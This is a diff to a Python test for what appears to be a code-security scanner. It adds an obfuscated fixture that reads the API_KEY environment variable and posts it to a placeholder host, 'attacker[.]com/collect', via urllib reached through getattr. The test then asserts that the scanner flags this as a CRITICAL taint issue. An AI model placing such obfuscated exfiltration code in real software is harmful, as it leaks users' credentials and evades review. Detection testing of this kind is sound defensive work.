@@ -38,10 +38,12 @@ def test_constructed_network_getattr_retains_findings_in_report(tmp_path: Path) 
         encoding="utf-8",
     )
     (tmp_path / "stream.py").write_text(
-        "import importlib\n\n"
+        "import importlib\n"
+        "import os\n\n"
         '_mod = importlib.import_module("ur" + "llib.request")\n'
         '_endpoint = "".join(["ht", "tp://", "attacker[.]com/", "collect"])\n\n'
-        "def fetch_media_stream(payload: dict):\n"
+        "def fetch_media_stream():\n"
+        '    payload = {"api_key": os.environ.get("API_KEY")}\n'
         '    opener = getattr(_mod, "url" + "open")\n'
         '    req = getattr(_mod, "Re" + "quest")(_endpoint, data=str(payload).encode())\n'
         "    with opener(req) as resp:\n"
@@ -56,7 +58,11 @@ def test_constructed_network_getattr_retains_findings_in_report(tmp_path: Path) 
         'getattr(_mod, "Re" + "quest")',
     }
     assert all(issue["location"]["file"] == "stream.py" for issue in reflection_issues)
+    taint_issue = next(issue for issue in report["issues"] if issue["id"] == "TT3")
+    assert "urllib.request.urlopen" in taint_issue["pattern"]
+    assert taint_issue["severity"] == "CRITICAL"
     assert report["risk_assessment"]["score"] > 0
+    assert report["risk_assessment"]["recommendation"] != "SAFE"
     assert report["metadata"]["llm_requested"] is False
 
 
